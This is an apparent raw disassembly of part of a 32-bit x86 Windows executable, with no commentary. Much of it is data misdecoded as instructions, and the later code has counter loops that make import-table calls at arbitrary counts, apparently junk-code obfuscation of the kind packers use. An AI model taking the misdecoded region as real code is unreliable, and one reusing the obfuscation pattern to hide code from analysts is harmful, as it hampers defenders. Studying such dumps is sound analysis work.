  40bb5b:	sub    eax,esp
  40bb5d:	es hlt 
  40bb5f:	jmp    0x35034c4e
  40bb64:	xchg   edi,ebx
  40bb66:	sar    BYTE PTR [edx-0x74],cl
  40bb69:	sub    eax,0x22514177
  40bb6e:	frstor [edi+ebx*8+0x45160282]
  40bb75:	pop    ebx
  40bb76:	aad    0xbb
  40bb78:	push   es
  40bb79:	bound  edx,QWORD PTR ds:[eax+0x37]
  40bb7d:	dec    ebx
  40bb7e:	ins    BYTE PTR es:[edi],dx
  40bb7f:	test   eax,0x72d064bb
  40bb84:	and    bl,bl
  40bb86:	mov    ds:0x4c108a71,al
  40bb8b:	rol    BYTE PTR [ebp-0x2309cae7],0x43
  40bb92:	or     BYTE PTR [ebx],dl
  40bb94:	ja     0x40bbd4
  40bb96:	stos   BYTE PTR es:[edi],al
  40bb97:	jp     0x40bb6f
  40bb99:	xchg   ebp,eax
  40bb9a:	ret    
  40bb9b:	push   ecx
  40bb9c:	out    dx,eax
  40bb9d:	popf   
  40bb9e:	rol    BYTE PTR [esi+0x23],cl
  40bba1:	jle    0x40bbe8
  40bba3:	adc    eax,0x3fc772da
  40bba8:	es jl  0x40bbaa
  40bbab:	fisttp QWORD PTR ds:0x10b64284
  40bbb1:	mov    al,0xf8
  40bbb3:	jbe    0x40bbdb
  40bbb5:	mov    DWORD PTR [ebp+0x1b49e814],edi
  40bbbb:	shl    ecx,cl
  40bbbd:	push   ecx
  40bbbe:	pop    esp
  40bbbf:	sbb    DWORD PTR [esi+0x14c0366c],esi
  40bbc5:	popa   
  40bbc6:	in     eax,dx
  40bbc7:	ror    BYTE PTR [ecx+esi*8-0x1fc6b628],0x90
  40bbcf:	cmp    ebp,DWORD PTR [esp+esi*8]
  40bbd2:	lods   eax,DWORD PTR ds:[esi]
  40bbd3:	add    bl,BYTE PTR [edi]
  40bbd5:	inc    esi
  40bbd6:	loopne 0x40bc04
  40bbd8:	imul   esi,ebp,0x94ee77b
  40bbde:	pop    ss
  40bbdf:	shl    DWORD PTR [esi-0x7a],0x26
  40bbe3:	pop    ss
  40bbe4:	inc    eax
  40bbe5:	adc    al,0xa0
  40bbe7:	hlt    
  40bbe8:	daa    
  40bbe9:	fist   WORD PTR [ebp-0x584f264e]
  40bbef:	sbb    ebx,ebp
  40bbf1:	xlat   BYTE PTR ds:[ebx]
  40bbf2:	retf   
  40bbf3:	jp     0x40bbf6
  40bbf5:	outs   dx,DWORD PTR ds:[esi]
  40bbf6:	repz inc ecx
  40bbf8:	add    al,0xe9
  40bbfa:	xor    dl,ah
  40bbfc:	sar    DWORD PTR [eax],cl
  40bbfe:	xor    DWORD PTR [eax],ebx
  40bc00:	fs push cs
  40bc02:	mov    ebp,0xa1802115
  40bc07:	ins    DWORD PTR es:[edi],dx
  40bc08:	mov    cl,0x57
  40bc0a:	(bad)  
  40bc0b:	sti    
  40bc0c:	xchg   edi,eax
  40bc0d:	retf   
  40bc0e:	(bad)  
  40bc0f:	popa   
  40bc10:	push   0x7e8462b9
  40bc15:	pop    ss
  40bc16:	mov    dl,0x3f
  40bc18:	mul    BYTE PTR [ecx+0x2ed268af]
  40bc1e:	mov    dh,0xd9
  40bc20:	pusha  
  40bc21:	ins    DWORD PTR es:[edi],dx
  40bc22:	daa    
  40bc23:	adc    eax,0x860d64e4
  40bc28:	ja     0x40bc71
  40bc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc2b:	icebp  
  40bc2c:	adc    DWORD PTR [ecx-0x112f6103],eax
  40bc32:	mov    esp,0x2cf0cc08
  40bc37:	xchg   ebp,eax
  40bc38:	and    esp,DWORD PTR [ecx+0x72]
  40bc3b:	mov    edx,0xfb21b8c6
  40bc40:	dec    ebp
  40bc41:	jl     0x40bca7
  40bc43:	sahf   
  40bc44:	lock test eax,0xac11f66
  40bc4a:	sub    al,0x11
  40bc4c:	cli    
  40bc4d:	xchg   BYTE PTR [eax],dh
  40bc4f:	inc    ebp
  40bc50:	xchg   esp,eax
  40bc51:	cmc    
  40bc52:	addr16 stc 
  40bc54:	shl    DWORD PTR [edx],cl
  40bc56:	outs   dx,BYTE PTR ds:[esi]
  40bc57:	dec    ebp
  40bc58:	add    dh,ah
  40bc5a:	lahf   
  40bc5b:	jmp    0x3da5:0x69a3e8a1
  40bc62:	imul   esp,ecx,0xc5415dad
  40bc68:	jmp    FWORD PTR [ebx+0x40]
  40bc6b:	retf   0x4759
  40bc6e:	push   ebx
  40bc6f:	fstp   TBYTE PTR [ebx+0x5f619bbc]
  40bc75:	jle    0x40bc52
  40bc77:	add    eax,0x28d2ee39
  40bc7c:	and    eax,0x372e0318
  40bc81:	inc    esp
  40bc82:	or     eax,0x49629a4f
  40bc87:	bound  edi,QWORD PTR [esi]
  40bc89:	mov    al,ds:0x63dc97cd
  40bc8e:	test   eax,edx
  40bc90:	test   ebx,edx
  40bc92:	in     al,0x5
  40bc94:	stos   DWORD PTR es:[edi],eax
  40bc95:	xchg   edi,eax
  40bc96:	cmp    eax,0xac3e1d4
  40bc9b:	mov    ch,0xf8
  40bc9d:	mov    eax,0x3bc035ed
  40bca2:	data16 mov cl,0x3a
  40bca5:	and    dh,dh
  40bca7:	ins    BYTE PTR es:[edi],dx
  40bca8:	inc    esi
  40bca9:	fldenv [di+0x1e5d]
  40bcae:	and    cl,BYTE PTR [ecx+0x49]
  40bcb1:	jl     0x40bcd2
  40bcb3:	(bad)  
  40bcb4:	mov    ah,0xbe
  40bcb6:	push   ebp
  40bcb7:	push   eax
  40bcb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcb9:	(bad)  
  40bcba:	jge    0x40bcb3
  40bcbc:	scas   al,BYTE PTR es:[edi]
  40bcbd:	xor    esp,ebp
  40bcbf:	push   edx
  40bcc0:	ret    0x53b7
  40bcc3:	call   0xafc0:0x345076dd
  40bcca:	sub    ebp,DWORD PTR [edx-0x2546320c]
  40bcd0:	xchg   BYTE PTR [ebp+ebx*1+0x4804a265],bh
  40bcd7:	cmp    BYTE PTR [edi+0x54681cd1],ah
  40bcdd:	test   ebp,ebx
  40bcdf:	sbb    BYTE PTR [ebp+0x1fbeaadb],bl
  40bce5:	mov    edx,0x8e695e6b
  40bcea:	stc    
  40bceb:	out    dx,eax
  40bcec:	add    bl,bh
  40bcee:	cmp    dh,0xba
  40bcf1:	push   esp
  40bcf2:	imul   ecx,eax,0x9
  40bcf5:	push   eax
  40bcf6:	lds    eax,FWORD PTR [edi-0xc]
  40bcf9:	bound  esp,QWORD PTR [edi+0x4b46190e]
  40bcff:	xchg   ebp,eax
  40bd00:	xchg   edx,eax
  40bd01:	push   eax
  40bd02:	inc    edx
  40bd03:	lods   al,BYTE PTR ds:[esi]
  40bd04:	xchg   DWORD PTR [edx-0x10],ebx
  40bd07:	test   DWORD PTR [ecx+0x25],ebp
  40bd0a:	mov    eax,ds:0x2db48052
  40bd0f:	mov    edi,0x91f20512
  40bd14:	sbb    BYTE PTR [eax-0x1359a463],ah
  40bd1a:	or     DWORD PTR [esp+eiz*2-0x63],eax
  40bd1e:	jae    0x40bd1e
  40bd20:	or     esp,DWORD PTR ds:0x612f83ef
  40bd26:	(bad)  
  40bd27:	ins    BYTE PTR es:[edi],dx
  40bd28:	push   ss
  40bd29:	pusha  
  40bd2a:	imul   edi,DWORD PTR [edi+0x29],0xffffffbd
  40bd2e:	sub    eax,0x1343bade
  40bd33:	out    dx,eax
  40bd34:	xor    al,0x34
  40bd36:	ss pushf 
  40bd38:	loopne 0x40bcf5
  40bd3a:	add    BYTE PTR [ebx],cl
  40bd3c:	call   0xcc71:0x353f7dcc
  40bd43:	dec    esp
  40bd44:	inc    edx
  40bd45:	inc    ebp
  40bd46:	js     0x40bd78
  40bd48:	jp     0x40bda6
  40bd4a:	scas   eax,DWORD PTR es:[edi]
  40bd4b:	loopne 0x40bd53
  40bd4d:	nop
  40bd4e:	ror    DWORD PTR [ebx-0x16f776f7],0x1c
  40bd55:	add    eax,DWORD PTR [eax]
  40bd57:	add    dh,ah
  40bd59:	dec    esp
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	push   edi
  40bd65:	popa   
  40bd66:	sub    eax,0x7e821cb6
  40bd6b:	jle    0x40bde7
  40bd6d:	jge    0x40bded
  40bd6f:	jle    0x40bdbc
  40bd71:	ficomp WORD PTR [ebx-0xf]
  40bd74:	push   edi
  40bd75:	loop   0x40bda9
  40bd77:	push   ds
  40bd78:	jns    0x40bd55
  40bd7a:	test   BYTE PTR [edi],dh
  40bd7c:	push   cs
  40bd7d:	frstor [ecx-0x46a96836]
  40bd83:	imul   BYTE PTR [edi+0x72e5a876]
  40bd89:	jo     0x40bd47
  40bd8b:	inc    edi
  40bd8c:	lahf   
  40bd8d:	jo     0x40bd31
  40bd8f:	dec    esi
  40bd90:	push   edx
  40bd91:	(bad)  
  40bd93:	adc    al,0xb2
  40bd95:	mov    ebp,0x385fc3c6
  40bd9a:	push   0xfc41d031
  40bd9f:	enter  0xaf9b,0x94
  40bda3:	icebp  
  40bda4:	mov    edx,0xbf9d8b60
  40bda9:	sti    
  40bdaa:	dec    esp
  40bdab:	sbb    esi,esp
  40bdad:	jmp    0xc28d:0x64b61b7c
  40bdb4:	scas   al,BYTE PTR es:[edi]
  40bdb5:	aam    0xe5
  40bdb7:	scas   eax,DWORD PTR es:[edi]
  40bdb8:	jg     0x40bddc
  40bdba:	shl    DWORD PTR [esi+ebp*8+0x3f58d33b],1
  40bdc1:	hlt    
  40bdc2:	pop    eax
  40bdc3:	inc    edx
  40bdc4:	dec    esi
  40bdc5:	and    BYTE PTR [ebp-0x28],bl
  40bdc8:	sti    
  40bdc9:	adc    DWORD PTR [edx+0x48],ebx
  40bdcc:	ret    0x6005
  40bdcf:	or     esi,DWORD PTR [edi+edi*1+0x332a030e]
  40bdd6:	jmp    0x40bda3
  40bdd8:	jnp    0x40bd6a
  40bdda:	mov    bh,0x2
  40bddc:	sbb    eax,0x5391050a
  40bde1:	xor    eax,0xb6eb29d8
  40bde6:	out    dx,al
  40bde7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bde8:	scas   al,BYTE PTR es:[edi]
  40bde9:	inc    edi
  40bdea:	mov    dh,0x81
  40bdec:	fadd   st,st(6)
  40bdee:	stos   DWORD PTR es:[edi],eax
  40bdef:	xor    al,dl
  40bdf1:	sub    eax,0x2b4746a5
  40bdf6:	mov    ah,0x6f
  40bdf8:	adc    BYTE PTR [esi+0x4f],bl
  40bdfb:	xor    BYTE PTR [ecx],cl
  40bdfd:	push   cs
  40bdfe:	js     0x40be3a
  40be00:	gs jns 0x40bd92
  40be03:	add    BYTE PTR [eax-0x3a6ff0e6],cl
  40be09:	nop
  40be0a:	sub    BYTE PTR [ebp+0x4c],al
  40be0d:	stc    
  40be0e:	pop    ds
  40be0f:	push   es
  40be10:	dec    ebx
  40be11:	loope  0x40bde0
  40be13:	mov    ah,0x28
  40be15:	fcmovnb st,st(7)
  40be17:	sub    BYTE PTR [eax-0x30],bl
  40be1a:	rcl    DWORD PTR [ecx],0x47
  40be1d:	mov    ecx,0xad059d33
  40be22:	into   
  40be23:	xchg   esp,eax
  40be24:	(bad)  
  40be25:	imul   ebx,DWORD PTR [ebx+esi*1],0xffffff9f
  40be29:	sahf   
  40be2a:	scas   al,BYTE PTR es:[edi]
  40be2b:	mov    bl,0xef
  40be2d:	enter  0x3374,0x78
  40be31:	mov    ds:0x6a9ac715,eax
  40be36:	sub    eax,0x24c25691
  40be3b:	xchg   BYTE PTR [edi],al
  40be3d:	ret    0xbdd8
  40be40:	xlat   BYTE PTR ds:[ebx]
  40be41:	fstp   QWORD PTR [edx+0x4f]
  40be44:	in     al,dx
  40be45:	es jg  0x40be25
  40be48:	cld    
  40be49:	loop   0x40be53
  40be4b:	pushf  
  40be4c:	sub    al,0x85
  40be4e:	and    DWORD PTR [esi-0x684714fc],esp
  40be54:	(bad)  
  40be55:	lahf   
  40be56:	js     0x40bdf7
  40be58:	push   0x93e37cf9
  40be5d:	arpl   cx,cx
  40be5f:	fwait
  40be60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be61:	push   0x47
  40be63:	or     al,0x5c
  40be65:	test   DWORD PTR [esi+esi*1+0x17],esi
  40be69:	sub    BYTE PTR [esi],ch
  40be6b:	scas   eax,DWORD PTR es:[edi]
  40be6c:	sub    eax,0xe25e6371
  40be71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be72:	(bad)  
  40be73:	inc    ebp
  40be74:	pop    ebp
  40be75:	jg     0x40bede
  40be77:	test   al,0x39
  40be79:	jecxz  0x40be00
  40be7b:	cwde   
  40be7c:	jp     0x40beb0
  40be7e:	push   ebx
  40be7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be80:	cmp    esp,DWORD PTR [ecx+0x169fc644]
  40be86:	and    dl,BYTE PTR [esi-0x3ca7f560]
  40be8c:	sbb    edi,DWORD PTR [ebx-0x27aacab6]
  40be92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be93:	mov    edx,0x5a733bf8
  40be98:	in     eax,dx
  40be99:	add    eax,0x67bf7703
  40be9e:	dec    esi
  40be9f:	inc    ebp
  40bea0:	adc    ebp,ebp
  40bea2:	push   esi
  40bea3:	fstp   TBYTE PTR [ebx]
  40bea5:	outs   dx,BYTE PTR ds:[esi]
  40bea6:	add    eax,0x4c19dd39
  40beab:	mov    eax,0x51fc36fe
  40beb0:	xor    DWORD PTR [edi+0x63],ebp
  40beb3:	dec    ebp
  40beb4:	shl    DWORD PTR [ebp-0x7d],0x9d
  40beb8:	ror    BYTE PTR [ebp-0x6c],cl
  40bebb:	retf   
  40bebc:	arpl   WORD PTR [esi-0x7d],cx
  40bebf:	pop    edi
  40bec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec1:	inc    ebx
  40bec2:	sbb    edi,0xffffffc5
  40bec5:	test   DWORD PTR [eax+eax*4],edx
  40bec8:	hlt    
  40bec9:	xchg   ebx,eax
  40beca:	cld    
  40becb:	test   eax,0xd2f2bd3a
  40bed0:	cmp    dl,BYTE PTR [edx+0x18]
  40bed3:	ret    0x7665
  40bed6:	jmp    0xa64f308d
  40bedb:	cmp    al,0x50
  40bedd:	and    al,0x73
  40bedf:	xor    al,0x92
  40bee1:	mov    esp,0x415640ae
  40bee6:	push   ss
  40bee7:	push   ebp
  40bee8:	inc    edx
  40bee9:	pusha  
  40beea:	and    eax,0x8c8f969
  40beef:	xchg   ebx,eax
  40bef0:	mov    esp,0x4b497205
  40bef5:	pop    eax
  40bef6:	jmp    0x40bf1d
  40bef8:	fwait
  40bef9:	(bad)  
  40befa:	xlat   BYTE PTR ds:[ebx]
  40befb:	cs jp  0x40bf3a
  40befe:	rcr    DWORD PTR [esi+0x4b],0x21
  40bf02:	sahf   
  40bf03:	popa   
  40bf04:	push   cs
  40bf05:	inc    ebp
  40bf06:	stos   BYTE PTR es:[edi],al
  40bf07:	xchg   esp,eax
  40bf08:	dec    edx
  40bf09:	mov    edi,0xa4c767bf
  40bf0e:	fisub  DWORD PTR [ecx]
  40bf10:	loopne 0x40bef9
  40bf12:	pop    esi
  40bf13:	pop    edx
  40bf14:	int    0x43
  40bf16:	enter  0x2cd,0x10
  40bf1a:	fadd   DWORD PTR [ecx-0x3f7fc166]
  40bf20:	int3   
  40bf21:	sub    ch,al
  40bf23:	(bad)  
  40bf25:	mov    ds,WORD PTR [esi+0x4]
  40bf28:	dec    esp
  40bf29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf2a:	xchg   ecx,eax
  40bf2b:	std    
  40bf2c:	inc    esi
  40bf2d:	and    bl,dl
  40bf2f:	inc    edi
  40bf30:	xor    eax,0xec0119c7
  40bf35:	fcomp  QWORD PTR ds:0xa2b1c82a
  40bf3b:	popa   
  40bf3c:	lods   al,BYTE PTR ds:[esi]
  40bf3d:	sbb    cl,BYTE PTR [eax-0x43206c5]
  40bf43:	mov    BYTE PTR [edx],bl
  40bf45:	scas   al,BYTE PTR es:[edi]
  40bf46:	inc    edi
  40bf47:	cmp    esi,eax
  40bf49:	pusha  
  40bf4a:	out    dx,eax
  40bf4b:	aam    0xd5
  40bf4d:	scas   al,BYTE PTR es:[edi]
  40bf4e:	scas   al,BYTE PTR es:[edi]
  40bf4f:	inc    edx
  40bf50:	xchg   esp,eax
  40bf51:	jl     0x40bf1c
  40bf53:	fidivr WORD PTR [ecx]
  40bf55:	bound  eax,QWORD PTR [esi-0x2e7d5c1b]
  40bf5b:	and    ebp,DWORD PTR [edi-0x2bafa1b]
  40bf61:	ret    0x7baf
  40bf64:	mov    al,ds:0xb690e2b2
  40bf69:	popa   
  40bf6a:	fistp  WORD PTR [eax+edi*4-0x50]
  40bf6e:	mov    ds:0xb2f4089d,al
  40bf73:	xchg   ebp,eax
  40bf74:	fisubr WORD PTR [ebx]
  40bf76:	xor    edi,ebx
  40bf78:	retf   0x3c2f
  40bf7b:	fidivr WORD PTR [edx+0x40f33396]
  40bf81:	fldl2t 
  40bf83:	add    eax,0x859b6535
  40bf88:	jecxz  0x40bf8b
  40bf8a:	push   ecx
  40bf8b:	je     0x40bf7b
  40bf8d:	sub    ah,BYTE PTR cs:[ebx]
  40bf90:	retf   
  40bf91:	ins    BYTE PTR es:[edi],dx
  40bf92:	jg     0x40bf9b
  40bf94:	jae    0x40bf76
  40bf96:	imul   esp,DWORD PTR [eax+0x4b],0xdebf36c0
  40bf9d:	inc    eax
  40bf9e:	add    dl,BYTE PTR [eax+0x1e1b6b43]
  40bfa4:	sti    
  40bfa5:	sbb    eax,esp
  40bfa7:	les    eax,FWORD PTR [ebp-0x61b33265]
  40bfad:	adc    al,0x68
  40bfaf:	xor    bh,al
  40bfb1:	inc    esi
  40bfb2:	cmp    al,0xd4
  40bfb4:	cld    
  40bfb5:	call   0x1307:0x952addeb
  40bfbc:	xor    al,0x36
  40bfbe:	retf   0x6c40
  40bfc1:	inc    BYTE PTR ds:0x4814f8ce
  40bfc7:	mov    WORD PTR [edx+0x2078a9c4],fs
  40bfcd:	add    eax,0x36c4a6c9
  40bfd2:	pop    ebp
  40bfd3:	inc    edx
  40bfd4:	dec    esp
  40bfd5:	cmp    ch,BYTE PTR [edi+ebp*8+0x73281fbb]
  40bfdc:	push   0x2b
  40bfde:	idiv   bh
  40bfe0:	(bad)  
  40bfe1:	shr    BYTE PTR [ecx-0xf],cl
  40bfe4:	cmp    al,0xe
  40bfe6:	and    ch,ah
  40bfe8:	or     esp,DWORD PTR [esi-0x155d53a3]
  40bfee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfef:	mov    ecx,0xdaac7739
  40bff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff5:	jno    0x40c001
  40bff7:	pop    esi
  40bff8:	adc    dh,BYTE PTR [edi-0x226351da]
  40bffe:	sub    dh,BYTE PTR [ebp+0x10]
  40c001:	sahf   
  40c002:	and    eax,0x8d21bd
  40c007:	jo     0x40bfcf
  40c009:	xor    esi,DWORD PTR [ebx-0x44c720b1]
  40c00f:	jle    0x40bfbf
  40c011:	sub    dl,BYTE PTR [ebx+0x65]
  40c014:	adc    al,0x7b
  40c016:	cmp    ebp,edi
  40c018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c019:	dec    eax
  40c01a:	jmp    0xb353:0x436938b2
  40c021:	sub    BYTE PTR [edx],dl
  40c023:	scas   al,BYTE PTR es:[edi]
  40c024:	and    dh,BYTE PTR [ebx+0xfc84bac]
  40c02a:	stos   BYTE PTR es:[edi],al
  40c02b:	cwde   
  40c02c:	test   al,0xa9
  40c02e:	inc    ebp
  40c02f:	out    0x76,eax
  40c031:	inc    ecx
  40c032:	adc    bl,BYTE PTR [esi-0x4d4eff39]
  40c038:	or     al,0xf2
  40c03a:	push   edx
  40c03b:	lods   al,BYTE PTR ds:[esi]
  40c03c:	cdq    
  40c03d:	ins    DWORD PTR es:[edi],dx
  40c03e:	fnstcw WORD PTR [edx]
  40c040:	rol    ebp,0xed
  40c043:	xchg   ebp,eax
  40c044:	or     eax,0xcdfaf3aa
  40c049:	gs (bad) 
  40c04b:	push   edx
  40c04c:	cdq    
  40c04d:	push   0x2e35def4
  40c052:	or     BYTE PTR [ebp-0xf088b2f],dh
  40c058:	inc    ebx
  40c059:	js     0x40c055
  40c05b:	cmp    eax,0x60d6f2d4
  40c060:	mov    bl,0xa4
  40c062:	adc    BYTE PTR [edi],0xb4
  40c065:	hlt    
  40c066:	ret    
  40c067:	jno    0x40c033
  40c069:	jmp    0x4b18:0xdf569bb0
  40c070:	call   0xc45:0x8bafc529
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
